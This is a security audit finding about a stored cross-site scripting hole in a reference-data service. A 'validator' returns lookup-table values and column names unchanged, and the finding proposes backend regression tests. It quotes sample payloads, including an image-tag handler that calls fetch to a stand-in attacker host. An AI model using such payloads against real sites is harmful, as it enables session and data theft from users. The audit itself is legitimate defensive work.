behaviour: |-
  **HIGH — `LookupCharValidator.getValue` returns the input string verbatim — the Lookup-Table row-value surface is the F-004 stored-XSS family's MASTER-DATA-MANAGEMENT sibling.** Primary-source confirmed in the batch-V ReferenceDataController sidecar:

  - **Validator tier — pass-through**: `LookupCharValidator.java:14-17` declares `public Object getValue(final String value, final String columnName) { return value; }` — the "validator" name is misleading; the implementation is a no-op pass-through. Any input string is accepted verbatim.
  - **Repository tier — parameterised but unsanitized**: `ReferenceDataRepositoryImpl.java:117-150` (`addDataToLookupTable`) uses `DSL.val(...)` for SQL safety (SQL injection mitigated), but applies NO content-side sanitization, NO length cap, NO scheme allowlist, NO encoding.
  - **OpenAPI schema tier — no constraint**: `components.yaml:4006-4025` declares `LookupTableRowColumnFormData.value: type: string` with NO `maxLength`, NO `pattern`, NO `format`.
  - **Table + column metadata tier — same pass-through**: `LookupTableFieldFormData` (`components.yaml:3863-3882`) has no constraint on `name`, `description`, `default_value`. Operators authoring a column named `<script>alert(1)</script>` succeed; the column-name persists verbatim.

  **Cross-family with F-004**: F-004 names the description-editing stored-XSS surface family on the entity-side. This gap adds the Master-Data-Management (P-03) sibling: a lookup table row value, a column name, a table name, or a description field, stored verbatim, can carry `<script>` / `<img onerror>` / `javascript:` payloads through to UI render. The Lookup Tables surface is read-collaborative-posture (per the sister `bugs_limitations_corner_cases.[0]` finding — every authenticated user reads any lookup table), so the blast radius is the entire authenticated-user pool.

  **Compound failure with `buildTableName` collision (TEST-GAP-734)**: the unsafe input acceptance at the row-value surface combines with the lossy `buildTableName` lowercasing at the table-name surface — two distinct vulnerabilities on the same controller. The aggregate finding is that the Lookup Tables surface has the SAME F-004 verbatim-storage class as the entity description surface, plus an additional table-name collision class. The doc page (per sidecar `doc_drift_findings`) discloses NEITHER class.

  **Operator-observable consequences**:
  - A row value `<img src=x onerror=fetch('https://evil.example/exfil')>` in a Lookup Table renders to every authenticated user viewing the table — including operators auditing the table in the Master Data tab.
  - A column name `<script>alert(1)</script>` in a Lookup Table renders to every authenticated user viewing the schema view of the table.
  - The Lookup Tables UI renders these fields in three contexts (table details page, faceted search results, the schema view). Each context is a separate XSS surface; the F-004 family's UI-tier defence (Markdown.tsx) may NOT apply (these are NOT Markdown-rendered fields, they are plain-text fields rendered by table grid components — different defence-in-depth contract).

  **Why HIGH not CRITICAL**: the Master-Data-Management surface is operator-curated by definition (P-03 is "operator-curated reference data"); attackers with `LOOKUP_TABLE_DATA_CREATE` are presumed operator-trusted. BUT the read-collaborative posture means EVERY authenticated user reads every lookup table cross-namespace — so the read-tier attack surface is wider than the write-tier permission grant. Plus the doc page does NOT disclose the read-collaborative posture or the verbatim-storage contract — operators cannot author RBAC policies that contain this. HIGH.

  **Test gap shape**: regression-pin at the BACKEND tier asserting verbatim storage for row values, column names, and table names. Pair with a UI-tier dynamic probe extension verifying that the table-grid render path applies (or does NOT apply — TBD) the F-004 sibling defence.
